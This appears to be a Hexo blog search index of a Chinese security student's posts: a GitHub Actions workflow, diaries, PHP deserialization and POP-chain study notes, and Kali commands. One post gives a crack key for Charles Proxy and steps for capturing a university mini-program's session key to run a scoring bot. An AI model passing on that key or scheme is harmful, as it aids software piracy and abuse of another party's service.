<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>20230202</title>
      <link href="/2023/02/02/20230202/"/>
      <url>/2023/02/02/20230202/</url>
      
        <content type="html"><![CDATA[<h3 id="Github-Action"><a href="#Github-Action" class="headerlink" title="Github Action"></a>Github Action</h3><p>今天小小地了解了一下Github Action这个东西<br>感觉它实际上就是一个轻量级服务器而已<br>用户每个月有限制内存和运行时间，但是基本上不用担心用完</p><p>Action可以选择很多模板，也可以自己设置定时任务。<br>文件是yaml类型，语法不难理解<br>尝试几次就成功把以前那个该死的经典诵读文件做成一个定时任务了。</p><p>感觉很好的是密钥的添加很方便，也很好管理<br>但是，还是要翻旧账批评它没有一键删除history这个功能</p><p>这个定时任务文件代码放在这里了，有需要的自己改了用吧</p><pre><code># This workflow will install Python dependencies, run tests and lint with a single version of Python# For more information see: https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-pythonname: Python applicationon:  schedule:  # 定时任务，在每天的上午11点推送天气信息到邮箱    - cron: &#39;0 3 * * *&#39;    jobs:  build:    runs-on: ubuntu-latest    steps:    - uses: actions/checkout@v3    - name: Set up Python 3.10      uses: actions/setup-python@v3      with:        python-version: &quot;3.10&quot;            - name: Install dependencies      run: |        python -m pip install --upgrade pip        pip install flake8 pytest        pip3 install requests        if [ -f requirements.txt ]; then pip install -r requirements.txt; fi            - name: RunScripts      run: |        # stop the build if there are Python syntax errors or undefined names        python 程序.py        # exit-zero treats all errors as warnings. The GitHub editor is 127 chars wide</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>202301月总结</title>
      <link href="/2023/02/01/202301%E6%9C%88%E6%80%BB%E7%BB%93/"/>
      <url>/2023/02/01/202301%E6%9C%88%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>半个月前，我一时兴起入坑QQbot，在go-cqhttp和nonebot2上接触到异步代码。<br>以及，在Python的异步代码里使用requests会堵塞这个问题。<br>自己写了点插件，也爬了很多api端口和网站。<br>本来想着在官网上也发布一个插件的，但是想想自己的臃肿的代码还是算了。<br><img src="https://s2.loli.net/2023/02/02/V57JDlnIgtaz2iq.png" alt="Bot长这样"><br><img src="https://s2.loli.net/2023/02/02/x8DAz94RnSQHZVJ.png" alt="查看服务器状态的插件"><br>近几天在玩刷机，拿个高通410的随身wifi刷了Debian。<br>超频到2.1GHz，同时释放了内存，现在它有这么大！<br><img src="https://s2.loli.net/2023/02/02/JeSaDVBqiMIc5yZ.png" alt="就问你离不离谱！"><br>你敢相信？他能跑上面所说的nonebot2<br>甚至能流畅运行1.8.8及更高版本的mc服务器！<br>今天下午试着用ZeroTier内网穿透，但是很可惜没做完。</p><p>由于17号要开学了，所以接下来还是多看看课本吧。<br>毕竟开学之后每周一从早八到晚上九点真的要命！！！</p>]]></content>
      
      
      <categories>
          
          <category> 闲聊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 闲聊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新年快乐！</title>
      <link href="/2023/01/21/%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90%EF%BC%81/"/>
      <url>/2023/01/21/%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2023/01/20/1R8PjGN5Baq7dJW.jpg" alt="随便写点东西"><br><img src="https://s2.loli.net/2023/01/20/PJjSVf2ZcrsplF6.png" alt="随便放点喜欢的图"><br><img src="https://s2.loli.net/2023/01/20/5QgoSpuZj8tzY4H.jpg" alt="过年就要做喜欢的事"><br><img src="https://s2.loli.net/2023/01/20/ASsKZNOHUvQ1oh3.jpg" alt="开心就好呐"><br><img src="https://s2.loli.net/2023/01/20/cUhNVqupKTbSa57.png" alt="过去没达到的目标"><br><img src="https://s2.loli.net/2023/01/20/QPysl5H9gJKNMY3.png" alt="就让它留在过去吧"><br><img src="https://s2.loli.net/2023/01/20/T5jayCcslFYtbG7.jpg" alt="但是现在立下的目标"><br><img src="https://s2.loli.net/2023/01/20/sDyIUJd1zkepg5H.jpg" alt="一定要为它负责啊！"></p><h6 id="小事记"><a href="#小事记" class="headerlink" title="小事记"></a>小事记</h6><p>本来打算在春节之前写完一个CVE的漏洞复现，但是写了一半才发现已经被师兄抢了！！！<br>师兄你不讲武德，抢了所有任务里最简单的一个哈哈哈。<br>没办法只能写另外一个CVE了，但是由于不是很懂java和c，所以理解很困难。<br>看了一堆大佬的文章之后终于搞明白了，也磕磕绊绊地大概写了一个exp<br>最后看到只能自己搭建漏洞环境来测试，这下就真的顶不住了……<br>现在我不打算继续搭建了，毕竟这样子做出来的成本太高，效果很差不说，跟我现在接触的知识还有些脱节。</p><h6 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h6><p>世界有长久事物，便是安慰。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20230112</title>
      <link href="/2023/01/12/20230112/"/>
      <url>/2023/01/12/20230112/</url>
      
        <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2023/01/12/HxhJLnMmr7TvGIX.png" alt="真正值得纪念的，或许不止是一张画片"><br><img src="https://s2.loli.net/2023/01/13/1vqJb5eflmtMFIp.png" alt="你见证了她的努力，此时就再守护她一会吧"><br><img src="https://s2.loli.net/2023/01/13/sCdprRjVKS1Gz3X.png" alt="想找出“恋爱”的公式，或许还需要一段时间"><br><img src="https://s2.loli.net/2023/01/13/SHhNsIKOYijGLuz.png" alt="玫瑰的意义，只存在于你我心中"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20230107</title>
      <link href="/2023/01/07/20220107/"/>
      <url>/2023/01/07/20220107/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><p>今天是广州某大学的wx小程序研究资料。<br>既然来了，那么话不多说，直接上教程<br>首先下载安装必备的应用<br><em>关于Python的安装和环境配置就不在这里赘述了</em><br><strong><a href="https://blog.csdn.net/qq_45502336/article/details/109531599?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167291320016800186585384%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=167291320016800186585384&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-9-109531599-null-null.142%5Ev70%5Econtrol,201%5Ev4%5Eadd_ask&utm_term=python&spm=1018.2226.3001.4187">Python传送门</a></strong><br><strong>Charles</strong><br>1.前往<a href="https://www.charlesproxy.com/download/">官网</a>下载安装最新版本<br><img src="https://s2.loli.net/2023/01/07/m1S8RCupIAgQyP9.png" alt="随便选个喜欢的"><br>2.在下图处输入<strong>pojie</strong>和<strong>9d8fb452d26c0decc5</strong>后确定<br><img src="https://s2.loli.net/2023/01/07/ZzpSn2uRG8BgIoA.png" alt="恭喜你解锁VIP"></p><h5 id="接下来是抓包"><a href="#接下来是抓包" class="headerlink" title="接下来是抓包"></a>接下来是抓包</h5><p>1.关闭防火墙:打开网络设置&gt;高级网络设置&gt;Windows防火墙&gt;公用网络&gt;关闭并确认<br>2.在PC端wx中打开该小程序<br>3.在任务管理器里找到该小程序的应用<br><img src="https://s2.loli.net/2023/01/07/meVHGjo6vDNUScL.png" alt="找到这个万恶之源！"><br>4.右键点开小程序，打开文件所在位置，找到一个叫Runtime的包<br>5.将小程序和微信都关闭掉（否则部分文件删除不掉），然后将Runtime包下的文件都删除掉<br>6.把Runtime文件夹改为只读状态<br><img src="https://s2.loli.net/2023/01/07/YtoPvDxO6Z8unwa.png" alt="就是这个"><br>7.重新进入该wx小程序登录<br>8.打开Charles后在小程序内随意进入一个页面<br>9.CTRL+F输入<strong>key</strong>找到并复制字段<br><img src="https://s2.loli.net/2023/01/07/ruwzPXvIG7AWCNB.png" alt="就类似于这样，不能放得更多了"></p><h5 id="最后开始让代码跑起来"><a href="#最后开始让代码跑起来" class="headerlink" title="最后开始让代码跑起来"></a>最后开始让代码跑起来</h5><p>在主程序的这个位置粘贴刚刚复制的key并运行<br><img src="https://s2.loli.net/2023/01/07/tSf9DFdlPKWLBbs.png" alt="报错没有库的自己装"></p><h4 id="这就结束了？当然不！"><a href="#这就结束了？当然不！" class="headerlink" title="这就结束了？当然不！"></a>这就结束了？当然不！</h4><h5 id="接下来是移动端部分"><a href="#接下来是移动端部分" class="headerlink" title="接下来是移动端部分"></a>接下来是移动端部分</h5><p>1.打开<a href="https://pan.baidu.com/s/1ff-HmcwQSz8cHGqgpMJrcw">百度网盘</a>链接下载安装pydriod，提取码:de5q<br>2.打开保存在手机里的主程序文件并填入key<br>3.左栏Pip中选择INSTALL，分别输入requests,json,random,urllib,time并INSTALL<br>4.左栏Settings的Editor选项内打开Preserve files on exit<br>5.点击大大的黄色的运行按钮</p><p>注:<br>如果运行时发生错误请检查网络或尝试重启<br>如果出现名字不显示或者各种奇奇怪怪的bug但确确实实在运行，那么看着就好(正所谓能跑就行)<br>如果显示<strong>得分失败，重新开始匹配</strong>就多等一会，因为没有真人跟你匹配是不会得分的<br>本章内容只对该小程序进行分析，仅限学习研究使用，严禁进行其他非法行为！造成的后果本人不承担相关责任。</p><p><em><strong>最后感谢该校各位前辈的指导和帮助！！！</strong></em></p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p><strong>每个烟花都像是盲盒，不知道点燃升空之后会是什么颜色、什么形状、会持续多久。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20230106</title>
      <link href="/2023/01/06/20220106/"/>
      <url>/2023/01/06/20220106/</url>
      
        <content type="html"><![CDATA[<h5 id="无聊玩了一下Midjourney，挺方便，功能也很强大"><a href="#无聊玩了一下Midjourney，挺方便，功能也很强大" class="headerlink" title="无聊玩了一下Midjourney，挺方便，功能也很强大"></a>无聊玩了一下Midjourney，挺方便，功能也很强大</h5><p><img src="https://s2.loli.net/2023/01/06/vBlOqfjzJATF2kG.png#pic_center" alt="荒星"><br><img src="https://s2.loli.net/2023/01/07/uTWD6a93ZHOlxLq.png#pic_center" alt="好像刀妹"><br><img src="https://s2.loli.net/2023/01/06/X1FeICpcr74lkL9.png#pic_center" alt="粉毛YYDS"></p><h5 id="最后放个邀请地址"><a href="#最后放个邀请地址" class="headerlink" title="最后放个邀请地址"></a>最后放个<a href="https://discord.com/invite/midjourney">邀请地址</a></h5>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20230105</title>
      <link href="/2023/01/05/20220105/"/>
      <url>/2023/01/05/20220105/</url>
      
        <content type="html"><![CDATA[<h5 id="能找到这里的都是Hentai"><a href="#能找到这里的都是Hentai" class="headerlink" title="能找到这里的都是Hentai"></a>能找到这里的都是<a href="https://track.mp3-malina.me/play-track/d33532303034b6303534368cb734823000/ff34543f34e2aa427c7b17347be4cc40/S3rl%20-%20Hentai.mp3">Hentai</a></h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20230104</title>
      <link href="/2023/01/04/20220104/"/>
      <url>/2023/01/04/20220104/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h5 id="图床的创建"><a href="#图床的创建" class="headerlink" title="图床的创建"></a>图床的创建</h5><p>市面上免费的图床有SM.MS&emsp;Sibnet&emsp; Shutterfly<br>不完全免费的也有腾讯云&emsp; 阿里云&emsp; 七牛云<br>这里我把阿里云和SM.MS都试了一下</p><p>创建的话就跟着下面的步骤走就行了:<br>一.阿里云<br>&emsp;1.打开<a href="https://www.aliyun.com/?spm=5176.8466032.top-nav.dlogo.27b81450NiIk8F">官网</a>点击右上角进行注册/登录<br>&emsp;2.实名认证<br>&emsp;3.在左上角折叠页面里选择对象存储OSS<br>&emsp;4.右侧Bucket管理板块点击添加Bucket<br>&emsp;5.名称填写Bucket的名字，读写权限更改为公共读，其他的默认即可<br>&emsp;6.创建完成之后鼠标移至右上角头像上，选择AccessKey管理<br>&emsp;7.查看Secret并分别复制两行ID<br>&emsp;8.前往<a href="https://github.com/Molunerfinn/PicGo/releases">PicGo下载页面</a>选择对应版本下载安装<br>&emsp;9.打开PicGo图床设置的阿里云页面填写相关资料<br>&emsp;10.上传区选择格式就能使用了<br>二.SM.MS<br>&emsp;1.<a href="https://smms.app/">官网注册/登录</a><br>&emsp;2.复制<a href="https://smms.app/home/apitoken">此页面</a>的Secret Token<br>&emsp;3.在<a href="https://smms.app/">此页面</a>上传文件<br>&emsp;4.打开PicGo的SM.MS页面粘贴Secret Token<br>&emsp;5.上传区选择格式就能使用了</p><p>注:<br>1.我在使用PicGo链接SM.MS时总是失败，不知道为啥<br>2.因为阿里云不是免费的，想省钱可以选择香港<br>3.一定要设置<a href="https://help.aliyun.com/document_detail/31869.html?spm=5176.8466032.bucket.28.27b81450rEXDcJ">防盗链</a></p><h5 id="图床在markdown中的使用"><a href="#图床在markdown中的使用" class="headerlink" title="图床在markdown中的使用"></a>图床在markdown中的使用</h5><p>方法一:使用img标签</p><pre><code> &lt;img src=&quot;图片地址&quot;&gt;</code></pre><p>方法二:md语法</p><pre><code> ![图片简介](图片地址)</code></pre><h5 id="更改图片参数"><a href="#更改图片参数" class="headerlink" title="更改图片参数"></a>更改图片参数</h5><pre><code>使用html更改位置&lt;center&gt;&lt;img src=&quot;地址&quot;&gt;&lt;/center&gt;居中对齐操作：#pic_center向左对齐操作：#pic_left向右对齐操作：#pic_right想调整图片的尺寸就在上面这个指令后面加上=200x200(=200x宽高自适应)width=&quot;100&quot;调整大小</code></pre><p>今天的内容就这么多，下次有空再继续写。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p><strong>眼下的生活，不是没有快乐。只是所有快乐都暗含着一层谨慎的底色。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年度总结</title>
      <link href="/2022/12/31/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
      <url>/2022/12/31/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h4 id="呆"><a href="#呆" class="headerlink" title="呆~"></a>呆~</h4><p>  简直突如其来呐。<br>  万万没想到一个月就过去了，时间过得真快啊。</p><p>  在2022年的抗疫决赛圈，几乎所有人都成了小阳人，其中也包括我。<br>  发烧第一天真的是给我吓到了，中午一觉起来高烧42.5℃，惊恐之余赶紧撑着摇摇欲坠的身体去买布洛芬(似乎我这个城市退烧药还算充足？)到晚上睡前才降到39℃。看到那个长度我真的是笑希了，感觉39℃也不过是小问题……<br>  (⁄ ⁄•⁄ω⁄•⁄ ⁄)<br>  感谢芙灵和一个现在被迫带烧返校的可怜的江苏高三Dog!<br>  现在病情已经到了欲说还休的阶段了，因此被鹅鸭杀劝退<del>，因此才能闲到来写这个文章</del><br>  希望早日康复吧，我还想吃正新鸡排</p><p>  这个小小站点活过了第一个国庆，第一个圣诞，马上就是元旦和春节了，希望这里能永远保存下去。<br>  最近了解了GitHub Arctic Code Vault这个东东，虽然说想得到这个可能有点不现实，但是可以把它当作理想吧。<br>  (づ ●─● )づ</p><p>  对于2023年的规划没有太多的变化，仍然是多学习，多看世界，多保重身体。<br>  人生刚刚开始，未来可期。<br>  犹豫不决的时候不要问别人，问自己。听别人的如果后悔了，是要后悔两次的。</p><p>  最后，元旦快乐~</p><p>  乾杯 []~ （￣▽￣） ~*</p><h5 id="20230104补档"><a href="#20230104补档" class="headerlink" title="20230104补档"></a>20230104补档</h5><p>  <strong>试验阿里云+PicGo图床</strong><br>   <img src="https://liuguobin-blog.oss-cn-hongkong.aliyuncs.com/base.png#pic_center" width="300"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221204</title>
      <link href="/2022/12/04/20221204/"/>
      <url>/2022/12/04/20221204/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><pre><code>【数组序列化】&lt;?php$a=null;echo serialize($a);?&gt;a:参数数量:&#123;i:0;s:字符串长度:&quot;字符串&quot;;&#125;$a=null;         N;$b=123456;       i:123456;$c=1.2;          d:1.2;$d=true;         b:1;$e=false;        b:0;$f=&#39;benben&#39;;     s:长度:字符串;【对象序列化】&lt;?phpclass lei&#123;    public $chengyuan=&#39;zifuchuan&#39;;    function hanshu()&#123;        echo $this-&gt;chengyuan;    &#125;&#125;$a=new lei();echo serialize($a);echo urlencode(serialize($a));?&gt;O:类名长度:&quot;类名&quot;:1:&#123;s:成员长度:&quot;成员名&quot;;s:值长度:&quot;值&quot;;&#125;修饰符public公有，private私有私有的成员属性要在前后都加上二进制的%00,在urlencode时可以看见【对象序列化的嵌套】&lt;?phpclass test&#123;    public $pub=&#39;benben&#39;;    function jineng()&#123;        echo $this-&gt;pub;    &#125;&#125;class test2&#123;    var $ben;&#125;$b=new test();$a=new test2();$a-&gt;ben=$b;echo serialize($a);?&gt;O:5:&quot;test2&quot;:1:&#123;s:3:&quot;ben&quot;;O:4:&quot;test&quot;:1:&#123;s:3:&quot;pub&quot;;s:6:&quot;benben&quot;;&#125;&#125;当在对象内调用对象时，会出现嵌套:实例化后的对象$a的成员变量&#39;ben&#39;调用实例化后的对象$b</code></pre><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>1.反序列化后的内容为一个对象，与序列化相反<br>2.反序列化生成的对象内的值，由反序列化里的值提供，与原有类预定义的值无关<br>3.反序列化不触发类的成员方法，需要调用方法之后才能触发</p><pre><code>&lt;?phpclass test&#123;    public $a=&#39;benben&#39;;    protected $b=666;    private $c=false;    public function displayVar()&#123;        echo $this-&gt;a;    &#125;&#125;$d=new test();$d=serialize($d);echo urlencode($d);$a=urlencode($d);$b=unserialize(urldecode($a));$b-&gt;displayVar();var_dump($b);?&gt;benbenobject(test)#1 (3) &#123;  [&quot;a&quot;]=&gt;  string(6) &quot;benben&quot;  [&quot;b&quot;:protected]=&gt;  int(666)  [&quot;c&quot;:&quot;test&quot;:private]=&gt;  bool(false)&#125;</code></pre><h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h4><p>概念:<br>预定好的，在特定的情况下处罚的行为方法。<br>反序列化成因(作用):<br>反序列化过程中unserizlize()接收的值(字符串)可控；<br>通过更改这个值(字符串)，所得到的代码；<br>通过调用方法，触发代码执行。<br>相关机制:<br>触发时机(先决条件)-&gt;功能(最重要)-&gt;参数(尤其是pop链)-&gt;返回值<br>详解:</p><pre><code>1.__construct()构造函数在实例化对象时，自动执行的方法只有当new时触发，不需要特地调用2.__destruct()析构函数在对象的所有引用都被删除或者对象被显式销毁时才触发new和unserialize之后会触发3.__sleep()清理对象可以传入成员属性，serialize之前触发并返回一个包含对象中所有需要被序列化的变量名称的数组如果无返回则NULL被序列化，产生E_NOTICE错误4.__wakeup()预先准备对象资源，返回void在unserialize前触发5.__tostring()表达方式错误把对象当成字符串调用时触发，如echo，print6.__invoke()格式表达错误把对象当成函数调用时触发，如echo $a() -&gt; hanshu7.__call()不存在方法不存在调用的方法时触发8.__callStatic()不存在方法静态调用或调用成员常量不存在时使用9.__get()不存在方法检查成员属性是否存在10.__set()不存在方法给不存在的成员属性赋值时触发11.__isset()或__empty()或__unset()不可访问对不可访问的属性访问时会触发如protect属性(不可读)或根本不存在的属性12.__clone()复制使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法__clone()</code></pre><p>注意:<br>1.只有该类或对象包含了该魔术方法才能被使用或触发<br>2.先分析尾部代码看看有什么执行的步骤<br>3.接着从触发的方法及其顺序判断漏洞的利用地点<br>4.最后构造playload<br>5.比较长的代码建议使用反推法进行分析<br>6.一定要先实例化(new)</p><h4 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h4><p>反序列化中成员变量可以被控制，使用有一种漏洞叫面向属性编程(POP)<br>POP链是利用魔术方法在里面多次跳转然后获取敏感信息的一种playload</p><h4 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h4><p>概念验证(POC)是漏洞验证程序，只是为了证明提出者观点的一段代码</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221202</title>
      <link href="/2022/12/02/20221202/"/>
      <url>/2022/12/02/20221202/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h4>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>20221202</title>
      <link href="/2022/12/02/20221202/"/>
      <url>/2022/12/02/20221202/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>202211月总结</title>
      <link href="/2022/12/01/20221201%E6%9C%88%E7%BB%93/"/>
      <url>/2022/12/01/20221201%E6%9C%88%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h5 id="又是一个月，该总结一下了"><a href="#又是一个月，该总结一下了" class="headerlink" title="又是一个月，该总结一下了"></a>又是一个月，该总结一下了</h5><p>  首先还是这个月干了啥。<br>  好像也没干啥？？？<br>  学了JS，PHP，数据库，一点点命令，还有算是课内知识的python爬虫<br>  虽然看着学了很多，但是基础并不牢固。<br>  因此<br>  我可能将要用至少一个月的时间来消化从建站到现在所学的内容<br>  毕竟…<br>  高数和现代终究是大头，还有一个计导虎视眈眈</p><p>  接着来说说接下来一个月的计划吧~<br>  首先，既然是在家上网课<br>  当然是要<br>  <del>吃了就睡，睡了就吃，跟个死猪一样</del><br>  <em><strong>好好学习，天天向上</strong></em></p><h5 id="鸭梨山大"><a href="#鸭梨山大" class="headerlink" title="鸭梨山大"></a>鸭梨山大</h5><p>  其实在这个月的学习中我的感触很深，网络安全绝不是一朝一夕可以完成的(屁话)<br>  现在所学的全部这些内容可以说都是前置知识的一部分<br>  包括在平时练习的CTF，都是走向安全的一段路<br>  那么，既然如此<br>  我更应该将重心放在基础上，而非一味的追求解题量<br>  甚至是成为众人最不屑的“赛棍”。</p><h5 id="还有啥好讲的？"><a href="#还有啥好讲的？" class="headerlink" title="还有啥好讲的？"></a>还有啥好讲的？</h5><p>  既然这是一篇发布在博客的文章，那就再聊聊博客的事吧<br>  首先是最令我头疼的事——主页解析的视频老是失效。真的是脑阔疼，我找了很久了，但是一直没有解决方法，如果有人有方法或是突发奇想请在GitHub上评论，十分感谢！！！<br>  然后是关于加载速度有些缓慢甚至是在网不好的情况下出现白屏的问题(响应速度还是蛮快的，并没有发生许多人所说的被墙的情况，尽管是在校园网的情况下)，是因为主页启用了过多插件的缘故，在一段时间后(可能年后有空时)，会对这个blog进行一次大修改，争取加载时间缩短到1000毫秒内吧。<br>  最后，还是重复说明一下。这个博客虽然是public的，但是我只希望它的作用只是个刻录我在大学四年或更久的时光里的里程碑。时不时记录下成长经历，时不时写点随笔，时不时慷慨地发点自己总结的知识梳理，方便我自己和其他来到这里的 <em><strong>朋友们</strong></em> 学习。</p><h5 id="好了，最后还是一句"><a href="#好了，最后还是一句" class="headerlink" title="好了，最后还是一句"></a>好了，最后还是一句</h5><p><strong>人，活的不是一个点，人活起伏。</strong><br>说人话版:是个三维的东西就不要天天像个二维的玩意一样躺平~</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali命令</title>
      <link href="/2022/11/21/Kali%E5%91%BD%E4%BB%A4/"/>
      <url>/2022/11/21/Kali%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="kali的常用命令"><a href="#kali的常用命令" class="headerlink" title="kali的常用命令"></a>kali的常用命令</h1><h3 id="1-基础命令"><a href="#1-基础命令" class="headerlink" title="1.基础命令"></a>1.基础命令</h3><pre><code>passwd 修改密码passwd root 修改root用户密码date 显示系统日期sudo 后面加命令 就可以调用管理权限apt-get update 更新软件列表访问源列表里的每个网址，并读取软件列表，然后保存在本地电脑。我们在新立得软件包管理器里看到的软件列表，都是通过update命令更新的。apt-get upgrade 更新软件把本地已安装的软件，与刚下载的软件列表里对应软件进行对比，如果发现已安装的软件版本太低，就会提示你更新。apt-get dist-upgrade 更新软件  --+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--【apt-get upgrade 与 apt-get dist-upgrade 的区别】upgrade:系统将现有的Package升级,如果有相依性的问题,而此相依性需要安装其它新的Package或影响到其它Package的相依性时,此Package就不会被升级,会保留下来.dist-upgrade:如果有相依性问题,需要安装/移除新的Package,就会试着去安装/移除它.(所以通常这个会被认为是有点风险的升级)apt-get upgrade 和 apt-get dist-upgrade 本质上是没有什么不同的，只不过dist-upgrade会识别出当依赖关系改变的情形并作出处理，而upgrade对此情形不处理。例如软件包 a 原先依赖 b c d，但是在源里面可能已经升级了，现在是 a 依赖 b c e。这种情况下，dist-upgrade 会删除 d 安装 e，并把 a 软件包升级，而 upgrade 会认为依赖关系改变而拒绝升级 a软件包。--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--clear 清屏sudo gpedit 特权调用gpedit编辑器reboot 重启apt-get install XXXXX 安装缺少的依赖包，（XXX）里面输入缺少依赖包的名字apt-get autoremove –purge 软件名 删除包及其依赖的软件包+配置文件等apt-get install +模块名 这种方法也可以安装模块,或者apt-get install python-模块名firefox 浏览器打开shutdown -h now 关闭系统(1)init 0 关闭系统(2)telinit 0 关闭系统(3)shutdown -h hours:minutes &amp; 按预定时间关闭系统shutdown -c 取消按预定时间关闭系统shutdown -r now 重启(1)reboot 重启(2)su -l 切换登陆用户logout 注销用户登陆pwd 当前路径</code></pre><h3 id="2-文件夹或文本操作"><a href="#2-文件夹或文本操作" class="headerlink" title="2.文件夹或文本操作"></a>2.文件夹或文本操作</h3><pre><code>cd .. 返回上一级目录cd ../.. 返回上级两级目录cd - 返回上次所在的目录cd 文件夹名  进去文件夹cd ~ 进去当前用户主目录pwd 显示当前工作路径touch 文件名  常见文件cat 文件名 读取文档内容mkdir 文件名 创建文件夹mkdir -p 文件夹 递归创建文件夹cp 复制命令cp -r moon moons 复制moon 文件夹到当前 moons 如果有里面有文件 使用-r mv 移动命令mv moon moons 也可以说是改名mkdir 文件名 文件名 创建多个文件夹ls 显示文件和文件夹名ls -a 显示所有的文件和文件夹 包含隐藏文件ls -l 显示文件和目录的详细资料rm -f 文件  删除文件rm 文件夹名 删除文件夹rm -rf  文件/文件夹  删除文件夹 及其目录下的文件bzip2 file1 压缩一个叫做 ‘file1’ 的文件gunzip file1.gz 解压一个叫做 ‘file1.gz’的文件gzip file1 压缩一个叫做 ‘file1’的文件gzip -9 file1 最大程度压缩rar a file1.rar test_file 创建一个叫做 ‘file1.rar’ 的包rar x file1.rar 解压rar包unrar x file1.rar 解压rar包dpkg -i package.deb 安装/更新一个 deb 包dpkg -r package_name 从系统删除一个 deb 包dpkg -l 显示系统中所有已经安装的 deb 包dpkg -l | grep httpd 显示所有名称中包含 “httpd” 字样的deb包dpkg -s package_name 获得已经安装在系统中一个特殊包的信息dpkg -L package_name 显示系统中已经安装的一个deb包所提供的文件列表dpkg –contents package.deb 显示尚未安装的一个包所提供的文件列表tar zcvf +压缩文件名 压缩文件tar zxvf +解压包名 解压文件tar -jcvf renwolesshel.tar.bz2 打包tar jxvf renwolesshel.tar.bz2 解压zip -q -r renwolesshel.zip renwolesshel/ 解压zip格式的压缩包unzip renwolesshel.zipwhich 加软件名 可以查出软件目录在哪./+文件名或者apt-get +文件名 安装文件</code></pre><h3 id="3-系统信息"><a href="#3-系统信息" class="headerlink" title="3.系统信息"></a>3.系统信息</h3><pre><code>arch 显示机器的处理器架构(1)uname -m 显示机器的处理器架构(2)uname -r 显示正在使用的内核版本cat /proc/version 显示内核的版本cat /proc/net/dev 显示网络适配器及统计cat /proc/cpuinfo 显示CPU info的信息cat /proc/mounts 显示已加载的文件系统</code></pre><h3 id="4-vi-常用命令"><a href="#4-vi-常用命令" class="headerlink" title="4.vi 常用命令"></a>4.vi 常用命令</h3><p>vi编辑器分为三种状态，分别是：<br>1.命令模式（command mode）<br>控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到 last line mode。<br>2.插入模式（Insert mode）<br>只有在Insert 